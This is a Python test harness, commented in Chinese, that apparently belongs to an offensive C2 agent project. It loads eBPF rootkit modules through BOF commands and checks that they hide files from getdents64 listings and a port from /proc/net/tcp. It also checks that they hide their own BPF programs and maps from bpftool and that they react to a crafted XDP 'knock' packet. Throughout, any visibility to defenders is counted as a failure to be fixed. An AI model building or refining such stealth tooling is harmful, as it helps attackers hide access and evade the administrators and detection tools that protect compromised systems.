#!/usr/bin/env python3
"""gap10_rootkit_verify.py — Phase 4 缺口 10：Phase 2 eBPF rootkit 复验（自动化）

验收项（doc/LIVE_TEST_CHECKLIST.md §缺口 10）：
  T1  ebpf_load 加载 4 模块（hide/tc_rewrite/knock/bpf_filter）
      → bpftool prog/map list **不可见**（ISS-007：hidden_bpf_ids 有写入方后）
      T1b 是非我方 map 的阳性对照，必须先 PASS，T1c/T1d 才有意义
  T2  Hide 激活 → getdents64 枚举不可见 → 取消隐藏后恢复
  T3  Knock 魔包 → XDP 命中（knock_seen 记录，包被 DROP 吞掉）
  T4  ebpf_unload → pin 清空、prog 数回落基线

自动化要点（三条都与被测对象的真实行为绑定，见同目录 REPORT）：
  * BOF 参数走 /agent/command/execute 的 param_data(base64) 通道，字节级精确。
    console 明文通道（`execute bof x.o a b c`）缺 4B 参数个数头，整串会错位 —— 不用它。
  * hide / tc_rewrite 的 perf_event attach 是 (pid=-1, cpu=0)，只覆盖 CPU 0（本机 2 核）。
    因此观测进程用 taskset -c 0 固定，既是确定性手段，也正好量出这个缺陷。
  * knock 用临时 veth 对（axg10a/axg10b）承接 XDP，全程不碰 eth0，SSH 零风险。

用法: gap10_rootkit_verify.py [--listener TestHTTP] [--keep]
"""
import base64, json, os, socket, sqlite3, struct, subprocess, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import e2e

BOF_DIR = "/root/cc/run/extenders/linux_agent/bofs"
BPF_OUT = "/root/cc/AdaptixServer/extenders/linux_agent/src_agent/bpf/out"

MARKER = "AXG10_MARKER"
MARKER_PATH = "/tmp/" + MARKER
PORT = 18446                       # 测试用监听端口（tc_rewrite 藏它）
PIN_H, PIN_T, PIN_K, PIN_B = "axg10h", "axg10t", "axg10k", "axg10b"
KEY16 = b"AXG10KNOCKKEY123"        # 16B，knock fold 取前 4 字节 LE
VETH_A, VETH_B = "axg10a", "axg10b"
WATCHDOG = "/tmp/gap10_watchdog.sh"

R = []          # (item, status, note)


def sh(cmd, timeout=60):
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return p.stdout.strip()


def rec(item, status, note=""):
    R.append((item, status, note))
    print("  [%-4s] %-46s %s" % (status, item, note), flush=True)


# ───────────────────────── BOF 调用（正确 ABI 打包） ─────────────────────────
def _sf(s):
    b = s.encode() if isinstance(s, str) else s
    return struct.pack("<I", len(b)) + b


def pack_load(insns, reloc, prog_type, attach, target, names, ports, key16, pin):
    """ebpf_load 的 9 个字段：2×Extract, 2×Int(裸4B!), 5×Extract"""
    return (struct.pack("<I", 9) + _sf(insns) + _sf(reloc) +
            struct.pack("<i", prog_type) + struct.pack("<i", attach) +
            _sf(target) + _sf(names) + _sf(ports) + _sf(key16) + _sf(pin))


def pack_unload(pin, kprobe=""):
    return struct.pack("<I", 2) + _sf(pin) + _sf(kprobe)


def send_bof(aid, name, blob):
    d = {"command": "execute", "subcommand": "bof",
         "bof": "%s/%s.o" % (BOF_DIR, name),
         "param_data": base64.b64encode(blob).decode()}
    e2e.send_execute(aid, "execute bof %s.o" % name, d)


def load(aid, mod, prog_type, attach, target, names="", ports="", key16=b"", pin=""):
    send_bof(aid, "ebpf_load", pack_load(
        "%s/%s.insns.bin" % (BPF_OUT, mod), "%s/%s.mapreloc.txt" % (BPF_OUT, mod),
        prog_type, attach, target, names, ports, key16, pin))


# ───────────────────────── 观测原语 ─────────────────────────
def prog_ids():
    out = sh("bpftool prog list 2>/dev/null")
    ids = set()
    for line in out.splitlines():
        if ":" in line and line.split(":")[0].strip().isdigit():
            ids.add(int(line.split(":")[0].strip()))
    return ids


KNOWN_PINS = (PIN_H, PIN_T, PIN_K, PIN_B)
PIN_SUFFIXES = ("_prog", "_map0", "_map1", "_map2", "_map3", "_map4",
                "_map5", "_map6", "_map7", "_link")


def pins(extra=()):
    """枚举 /sys/fs/bpf 的 pin 名 —— **两个来源的并集**。

    extra: 别的套件（p18/p19）导入本模块时传自己的 pin 名 —— 它们的 pin 一样
    会被 hide_names 盖住，而本模块的 KNOWN_PINS 只认自己的 axg10*。

    ⚠ P8 起我们自己的 pin 名进了 hide_names（ISS-062），而 `ls` 走的就是
    getdents64 → 光靠目录枚举**永远列不出我们自己的 pin**。后果不是"少几行输出"：
    T1 会退化成"pin=0 ≥ 28"恒假红 / 反过来若断言写成 `<=`，T4a 的"unpin 清空"
    就变成恒真。所以必须补第二个来源：

      ① 目录枚举           —— 还看得见别人的 pin（T1b 的对照 map ctrlg10 就靠它）
      ② 已知 pin 名 × 已知后缀，**按显式路径 stat** —— stat 走 sys_newlstat，
         hide_names 拦不到（这正是 P8 的隐藏"只挡枚举不挡按路径读"边界）。

    ② 是 ① 的超集（我们的 pin 全部由 PIN_H/T/K/B 派生），所以计数只会更准。
    """
    out = set()
    try:
        out |= set(os.listdir("/sys/fs/bpf"))
    except OSError:
        pass
    for p in tuple(KNOWN_PINS) + tuple(extra):
        for sfx in PIN_SUFFIXES:
            nm = p + sfx
            if os.path.exists("/sys/fs/bpf/" + nm):
                out.add(nm)
    return out


def map_names():
    """bpftool map list 里所有 map 的 name 集合。

    走 -j：纯文本形态对**无名** map 只打印类型（`7: hash  flags 0x0`），
    按名字找会漏；JSON 的 name 字段为此恒存在（无名时为空串）。
    """
    out = sh("bpftool -j map list 2>/dev/null")
    try:
        return set(m.get("name", "") for m in json.loads(out or "[]"))
    except Exception:
        return set()


def map_dump_keys(path):
    """返回 bpftool map dump 的 key 整数集合。

    三种形态都要认：
      (a) JSON: "key": 826206979             → hash 系列（int）
      (b) JSON: "key": ["0x03","0xa7",...]   → percpu 系列（*十六进制字符串数组*）
      (c) 纯文本: "key:" 换行 "03 a7 ..."    → -j 不可用时
    只认 (a) 会让所有 percpu map（knock_seen / hide 的 percpu 变体）永远解析成空集
    —— 这正是 T3a/T3a0 假阴性的根因（ISS-019）。
    """
    def _le(seq):
        b = bytearray()
        for x in seq:
            b.append(int(str(x), 16) if isinstance(x, str) else int(x))
        return int.from_bytes(bytes(b), "little")

    keys = set()
    try:
        for e in json.loads(sh("bpftool -j map dump pinned %s 2>/dev/null" % path) or "[]"):
            k = e.get("key")
            if isinstance(k, int):
                keys.add(k)
            elif isinstance(k, list):
                keys.add(_le(k))
    except Exception:
        pass
    if not keys:
        lines = sh("bpftool map dump pinned %s 2>/dev/null" % path).splitlines()
        for i, line in enumerate(lines):
            s = line.strip()
            if s.startswith("key:"):
                rest = s[4:].strip() or (lines[i + 1].strip() if i + 1 < len(lines) else "")
                hx = [t for t in rest.split() if len(t) == 2]
                try:
                    keys.add(int.from_bytes(bytes(int(t, 16) for t in hx), "little"))
                except Exception:
                    pass
    return keys


def ls_marker(cpu):
    """在指定 CPU 上枚举 /tmp，返回 MARKER 出现次数"""
    return int(sh("taskset -c %d ls -a /tmp 2>/dev/null | grep -c %s || true" % (cpu, MARKER)) or 0)


def port_visible(cpu):
    """在指定 CPU 上读 /proc/net/tcp，返回测试端口出现次数"""
    hexport = "%04X" % PORT
    return int(sh("taskset -c %d grep -c :%s /proc/net/tcp 2>/dev/null || true" % (cpu, hexport)) or 0)


# ───────────────── 任务真完成判定（不靠 sleep 赌） ─────────────────
# Consoles 里 type:106 = 已下发（a_completed:false），type:107 + a_completed:true = 真跑完。
# 之前每个 T 后只 sleep 1~2s 就断言，agent 还没 beacon 到任务 → 全 FAIL（ISS-013）。
def _console_rows(aid, limit=200):
    try:
        con = sqlite3.connect("file:%s?mode=ro" % e2e.DB, uri=True, timeout=5)
        rows = con.execute(
            "SELECT CAST(Packet AS TEXT) FROM Consoles WHERE AgentId=? ORDER BY Id DESC LIMIT ?",
            (aid, limit)).fetchall()
        con.close()
        return [d for (d,) in rows]
    except Exception:
        return []


def done_count(aid):
    return sum(1 for d in _console_rows(aid)
               if '"type":107' in d and '"a_completed":true' in d)


def wait_tasks(aid, want, timeout=180, what=""):
    """等到该 agent 的『已完成任务数』比调用前多 want 个。返回 (ok, base)。"""
    base = done_count(aid)
    t0 = time.time()
    while time.time() - t0 < timeout:
        if done_count(aid) - base >= want:
            return True, base
        time.sleep(1)
    got = done_count(aid) - base
    print("  [WARN] %s 等待超时：期望 +%d 个完成任务，实际 +%d" % (what, want, got), flush=True)
    return False, base


def bof_texts(aid, n=4):
    """最近 n 条 BOF 输出文本（用于把 ebpf_load 的回显打出来定位失败）"""
    out = []
    for d in _console_rows(aid, 40):
        if '"type":107' in d:
            try:
                out.append(json.loads(d).get("a_text", ""))
            except Exception:
                pass
        if len(out) >= n:
            break
    return out


def show_bof(aid, n=4):
    for t in bof_texts(aid, n):
        for line in (t or "").strip().splitlines()[:4]:
            print("      | %s" % line, flush=True)


def poll_until(fn, pred, timeout=15, step=0.5):
    """轮询本地观测原语直到 pred(值) 为真"""
    t0 = time.time()
    v = fn()
    while time.time() - t0 < timeout:
        v = fn()
        if pred(v):
            return v
        time.sleep(step)
    return v



# ───────────────────────── knock 魔包 ─────────────────────────
def knock_token(src_ip, src_port):
    fold = int.from_bytes(KEY16[:4], "little")
    ip = struct.unpack("!I", socket.inet_aton(src_ip))[0]
    return fold ^ (ip & 0xFFFF) ^ (src_port & 0xFFFF)


def build_knock_frame(seq, src_ip="10.99.99.2", dst_ip="10.99.99.1",
                      sport=40000, dport=12345):
    eth = b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + struct.pack("!H", 0x0800)
    smac = socket.inet_aton(src_ip)
    dmm = socket.inet_aton(dst_ip)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, (5 << 4), 0x02, 54321, 0, 0)
    tot = 20 + len(tcp)
    iph = struct.pack("!BBHHHBBH", 0x45, 0, tot, 0x1234, 0x4000, 64, 6, 0) + smac + dmm
    # IP 头校验和
    s = 0
    for i in range(0, len(iph), 2):
        s += (iph[i] << 8) | iph[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s = ~s & 0xFFFF
    iph = iph[:10] + struct.pack("!H", s) + iph[12:]
    return eth + iph + tcp


def send_frame(iface, frame):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    try:
        s.bind((iface, 0))
        s.send(frame)
    finally:
        s.close()


# ───────────────────────── 看门狗 / 清理 ─────────────────────────
WATCHDOG_SRC = """#!/bin/bash
sleep 900
ip link del axg10a 2>/dev/null
# P8 起我们自己的 pin 名进了 hide_names（ISS-062）→ `ls /sys/fs/bpf` 永远为空。
# 看门狗若继续用 ls，超时后就**什么都不清**，留下 30+ 个 pin 和一个 XDP link。
# 改成按**显式路径**逐个 stat/删：路径解析不走 getdents，隐藏拦不住。
for p in axg10h axg10t axg10k axg10b; do
  for s in _prog _map0 _map1 _map2 _map3 _map4 _map5 _map6 _map7 _link; do
    f=/sys/fs/bpf/$p$s
    [ -e "$f" ] || continue
    bpftool link detach pinned "$f" 2>/dev/null
    rm -f "$f"
  done
done
rm -f /sys/fs/bpf/ctrlg10
rm -f /tmp/AXG10_MARKER
echo "[gap10-watchdog] cleanup $(date -Is)" >> /tmp/gap10_watchdog.log
"""


def cleanup(pid=None):
    if pid:
        try:
            os.kill(pid, 9)
        except OSError:
            pass
    # Kill the watchdog PROCESS, not just its script file.  Deleting the script
    # leaves the already-running `bash watchdog` alive, and its `sleep 900`
    # expires mid-run — it then rm's /tmp/AXG10_MARKER under the test, which is
    # exactly what made T2c report "still hidden" after a successful unhide.
    sh("pgrep -f 'gap10_watchdo[g]' | while read p; do kill -9 $p 2>/dev/null; done")
    sh("rm -f %s" % WATCHDOG)
    sh("ip link del %s 2>/dev/null" % VETH_A)
    for p in sorted(pins()):
        if p.startswith("axg10"):
            sh("bpftool link detach pinned /sys/fs/bpf/%s 2>/dev/null" % p)
            sh("rm -f /sys/fs/bpf/%s" % p)
    sh("rm -f %s" % MARKER_PATH)
    # T1b 的阳性对照 map 也必须清：上面只删 axg10* 前缀的 pin，ctrlg10 会永久
    # 留在 /sys/fs/bpf —— 那是门 S1（磁盘零残留）的违例，而且 p17 的 T6 白名单
    # 扫不到"pin 文件"这种形态（它既不是进程也不是日志，只有 ls /sys/fs/bpf 看得见）。
    sh("rm -f /sys/fs/bpf/ctrlg10")


# ───────────────────────── 主流程 ─────────────────────────
def main():
    argv = sys.argv[1:]
    listener = argv[argv.index("--listener") + 1] if "--listener" in argv else "TestHTTP"
    keep = "--keep" in argv

    # 前置
    if not os.path.isdir("/sys/kernel/tracing/events/syscalls"):
        print("FATAL: /sys/kernel/tracing 未挂载"); return 2
    miss = [f for m in ("hide", "knock", "tc_rewrite", "bpf_filter")
            for f in ("%s/%s.insns.bin" % (BPF_OUT, m), "%s/%s.mapreloc.txt" % (BPF_OUT, m))
            if not os.path.exists(f)]
    if miss:
        print("FATAL: 缺 BPF 产物 %s" % miss); return 2
    if os.path.exists("/sys/fs/bpf/%s_prog" % PIN_H):
        print("FATAL: 上次运行的 pin 未清（先跑 cleanup）"); return 2

    with open(WATCHDOG, "w") as f:
        f.write(WATCHDOG_SRC)
    subprocess.Popen(["bash", WATCHDOG], stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL, start_new_session=True)

    print("[gap10] listener=%s  nproc=%s" % (listener, sh("nproc")), flush=True)
    binp = e2e.gen_agent(listener, "gap10")
    pid = e2e.launch(binp)
    aid = e2e.wait_registered(listener, pid, timeout=90)
    print("[gap10] agent up id=%s pid=%s" % (aid, pid), flush=True)

    lsn = None
    try:
        # ── 基线 ──
        base_ids, base_pins = prog_ids(), pins()
        os.makedirs("/tmp", exist_ok=True)
        open(MARKER_PATH, "w").write("x")
        lsn = socket.socket()
        lsn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        lsn.bind(("127.0.0.1", PORT)); lsn.listen(5)
        print("[gap10] 基线 prog=%d pins=%d | marker=%d port=%d" %
              (len(base_ids), len(base_pins), ls_marker(0), port_visible(0)), flush=True)

        sh("ip link del %s 2>/dev/null" % VETH_A)
        veth_ok = sh("ip link add %s type veth peer name %s && ip link set %s up && "
                     "ip link set %s up && echo OK" % (VETH_A, VETH_B, VETH_A, VETH_B)) == "OK"

        # ── T1 加载 4 模块 ──
        print("[T1] ebpf_load ×4", flush=True)
        n_mod = 0
        load(aid, "hide", 5, 1, "syscalls/sys_exit_getdents64", names=MARKER, pin=PIN_H); n_mod += 1
        load(aid, "tc_rewrite", 5, 1, "syscalls/sys_exit_read", ports=str(PORT), pin=PIN_T); n_mod += 1
        if veth_ok:
            load(aid, "knock", 6, 2, VETH_A, key16=KEY16, pin=PIN_K); n_mod += 1
        load(aid, "bpf_filter", 5, 1, "syscalls/sys_enter_bpf", pin=PIN_B); n_mod += 1
        t1_ok, _ = wait_tasks(aid, n_mod, 180, "T1")
        show_bof(aid, n_mod)
        rec("T1 4 模块加载任务全部完成回执", "PASS" if t1_ok else "FAIL",
            "期望 +%d 个 type:107 a_completed" % n_mod)

        # ── T1b 阳性对照：观测手段必须能看见一个**非我方**对象 ──
        # T1c/T1d 断言的是"看不见"。若 bpftool 坏了、或过滤器过滤过了头（把
        # 不属于我们的 id 也改写掉），阴性断言会**照样 PASS**。所以先手工建一个
        # 不经过 ebpf_load 的 map（因而永远不在 hidden_bpf_ids 里）当对照。
        # 名字刻意不用 axg10 前缀：T1e 靠 `startswith("axg10")` 数 pin，混进去会假绿。
        sh("rm -f /sys/fs/bpf/ctrlg10 2>/dev/null")
        sh("bpftool map create /sys/fs/bpf/ctrlg10 type hash key 4 value 1 entries 1 name ctrlg10 2>/dev/null")
        ctrl_seen = "ctrlg10" in map_names()
        rec("T1b 阳性对照 · 非我方 map 在 bpftool map list 可见",
            "PASS" if ctrl_seen else "FAIL",
            "ctrlg10 可见=%s（不可见=观测手段坏了，T1c/T1d 无意义）" % ctrl_seen)

        # ── T1c ★ ISS-007 核心：我方 prog 不再出现在 bpftool prog list ──
        # 修前这条是 `len(new_ids) >= want`，即**把漏洞当 PASS**。
        new_ids = prog_ids() - base_ids
        want = 4 if veth_ok else 3
        rec("T1c 我方 prog 在 bpftool prog list 不可见（ISS-007）",
            "PASS" if len(new_ids) == 0 else "FAIL",
            "新增 %d 个 prog id=%s; veth=%s（修前恒为 %d）" %
            (len(new_ids), sorted(new_ids), veth_ok, want))

        # ── T1d 我方 map 同样不可见 ──
        # hidden_bpf_ids 这个名字本身就是 IOC —— 它直白地写着"我在藏东西"。
        ours = set(["hide_names", "hidden_bpf_ids", "knock_key", "knock_seen",
                    "events", "hidden_ports", "trace_fds", "redact_fds"])
        leaked = sorted(ours & map_names())
        rec("T1d 我方 map 在 bpftool map list 不可见", "PASS" if not leaked else "FAIL",
            "泄漏 %s" % (leaked or "无"))
        pin_now = [p for p in pins() if p.startswith("axg10")]
        # 每模块 pin 7 个（_prog + _map0..5），knock 另加 _link
        pin_want = 7 * 3 + (8 if veth_ok else 7)
        rec("T1 pin 落盘 /sys/fs/bpf/<pin>_{prog,map0..5}",
            "PASS" if len(pin_now) >= pin_want else "FAIL",
            "axg10* pin=%d（期望 ≥%d）" % (len(pin_now), pin_want))

        # ── T2 hide / unhide ──
        print("[T2] hide → getdents64 不可见", flush=True)
        seen0 = poll_until(lambda: ls_marker(0), lambda v: v == 0, timeout=10)
        rec("T2a hide 生效（CPU0 枚举不可见）", "PASS" if seen0 == 0 else "FAIL",
            "taskset -c 0 ls|grep -c = %d（期望 0）" % seen0)
        seen1 = poll_until(lambda: ls_marker(1), lambda v: v == 0, timeout=10)
        rec("T2b hide 覆盖全部 CPU（逐 CPU perf attach）", "PASS" if seen1 == 0 else "FAIL",
            "taskset -c 1 ls|grep -c = %d（期望 0；ISS-006 修复前恒为 1）" % seen1)

        key = (MARKER.encode() + b"\x00" * 64)[:64]
        # bpftool v7.4 的 `key <bytes>` 是**十进制**解析（key 10 10 10 10 写入 0a0a0a0a），
        # 十六进制字节必须写 `key hex ...`，否则删的是另一个 key（ISS-021）。
        delout = sh("bpftool map delete pinned /sys/fs/bpf/%s_map0 key hex %s 2>&1; "
                    "bpftool map dump pinned /sys/fs/bpf/%s_map0 2>&1 | head -4" %
                    (PIN_H, " ".join("%02x" % b for b in key), PIN_H))
        open(MARKER_PATH, "w").write("x")   # 阳性对照：确保文件存在（防看门狗/上轮残留把 "仍不可见" 伪装成"仍隐藏"）
        seen_r = poll_until(lambda: ls_marker(0), lambda v: v >= 1, timeout=10)
        rec("T2c unhide（map delete）后恢复可见", "PASS" if seen_r >= 1 else "FAIL",
            "taskset -c 0 ls|grep -c = %d（期望 ≥1）; %s" %
            (seen_r, delout.replace("\n", " | ")[:150]))

        # ── T2d tc_rewrite 藏端口 ──
        print("[T2d] tc_rewrite → /proc/net/tcp 藏端口", flush=True)
        p0 = poll_until(lambda: port_visible(0), lambda v: v == 0, timeout=10)
        p1 = poll_until(lambda: port_visible(1), lambda v: v == 0, timeout=10)
        rec("T2d tc_rewrite 藏 :%d（两个 CPU 读 /proc/net/tcp）" % PORT,
            "PASS" if (p0 == 0 and p1 == 0) else "FAIL",
            "taskset -c 0 = %d / -c 1 = %d（均期望 0）" % (p0, p1))

        # ── T3 knock ──
        print("[T3] knock 魔包", flush=True)
        if not veth_ok:
            rec("T3 knock 魔包 → knock_seen", "SKIP", "veth 建链失败")
        else:
            tok = knock_token("10.99.99.2", 40000)
            frame = build_knock_frame(tok)

            # T3a0: BPF_PROG_TEST_RUN —— 把帧直接喂给程序，绕开 veth/XDP 投递。
            # 命中 = 程序逻辑与 token 推导都对，问题只可能在投递层。
            dump = sh("bpftool map dump pinned /sys/fs/bpf/%s_map2 2>&1 | head -3" % PIN_K)
            print("      knock_key(map2): %s" % dump.replace("\n", " | "), flush=True)
            open("/tmp/axg10_in.bin", "wb").write(frame)
            rx0 = sh("cat /sys/class/net/%s/statistics/rx_packets 2>/dev/null" % VETH_A)
            run_ok = sh("bpftool prog run pinned /sys/fs/bpf/%s_prog data_in /tmp/axg10_in.bin "
                        "data_out /tmp/axg10_out.bin 2>&1" % PIN_K).replace("\n", " ")
            keys_pr = map_dump_keys("/sys/fs/bpf/%s_map3" % PIN_K)
            rec("T3a0 BPF_PROG_TEST_RUN 命中（程序逻辑）", "PASS" if tok in keys_pr else "FAIL",
                "token=0x%08x map3=%s run=%s" % (tok, [hex(k) for k in keys_pr], run_ok[:90]))

            send_frame(VETH_B, frame)
            keys = poll_until(lambda: map_dump_keys("/sys/fs/bpf/%s_map3" % PIN_K),
                              lambda v: tok in v and v, timeout=12)
            rx1 = sh("cat /sys/class/net/%s/statistics/rx_packets 2>/dev/null" % VETH_A)
            rec("T3a 魔包命中 → knock_seen 记录 token", "PASS" if tok in keys else "FAIL",
                "token=0x%08x dump=%s rx %s→%s" % (tok, [hex(k) for k in keys], rx0, rx1))
            bad = tok ^ 0xFFFF
            send_frame(VETH_B, build_knock_frame(bad))
            time.sleep(1.5)
            keys2 = map_dump_keys("/sys/fs/bpf/%s_map3" % PIN_K)
            rec("T3b 错 token 不命中（负对照）", "PASS" if bad not in keys2 else "FAIL",
                "bad=0x%08x dump=%s" % (bad, [hex(k) for k in keys2]))

        # ── T4 unload ──
        print("[T4] ebpf_unload", flush=True)
        for pin in (PIN_H, PIN_T, PIN_K, PIN_B):
            send_bof(aid, "ebpf_unload", pack_unload(pin))
        t4_ok, _ = wait_tasks(aid, 4, 180, "T4")
        left = poll_until(lambda: [p for p in pins() if p.startswith("axg10")],
                          lambda v: not v, timeout=15)
        rec("T4a unpin（/sys/fs/bpf/axg10* 清空）", "PASS" if not left else "FAIL",
            "残留=%s（unload 回执 %s）" % (left, "齐" if t4_ok else "缺"))
        rec("T4b agent 存活（unload 不杀 beacon）", "PASS" if os.path.exists("/proc/%d" % pid) else "FAIL",
            "pid=%d" % pid)

        # 卸载后**先**数 prog，再杀 agent —— 顺序反过来就是 P4 那条教训的翻版：
        # 原版在 os.kill 之后才数，agent 一死 fd 全关、对象自然消失，于是
        # "unload 到底有没有释放对象"从来没被单独验证过（ISS-060 就躲在这个缝里：
        # 实测卸载后 prog id 705 存活过 t+15s，只有进程死才消失）。
        pre = poll_until(prog_ids, lambda v: v <= base_ids, timeout=20)
        rec("T4c 卸载后 prog 回落基线（**未杀 agent**）",
            "PASS" if pre <= base_ids else "FAIL",
            "卸载后=%d base=%d 残留=%s" % (len(pre), len(base_ids),
                                          sorted(pre - base_ids)))

        os.kill(pid, 9); pid = None
        time.sleep(3)
        final_ids = prog_ids()
        rec("T4d agent 退出后 prog 仍回落基线", "PASS" if final_ids <= base_ids else "FAIL",
            "final=%d base=%d 残留=%s" % (len(final_ids), len(base_ids),
                                          sorted(final_ids - base_ids)))

    except Exception as e:
        rec("EXCEPTION", "FAIL", "%s: %s" % (type(e).__name__, str(e)[:200]))
    finally:
        if lsn:
            lsn.close()
        if not keep:
            cleanup(pid);
            sh("rm -f %s" % WATCHDOG)

    p = len([1 for _, s, _ in R if s == "PASS"])
    f = len([1 for _, s, _ in R if s == "FAIL"])
    print("\n===== gap10 结果 =====")
    for item, st, note in R:
        print("  %-4s %s" % (st, item))
    print("PASS=%d FAIL=%d" % (p, f))
    print("RESULT: %s" % ("PASS" if f == 0 else "FAIL"))
    return 0 if f == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
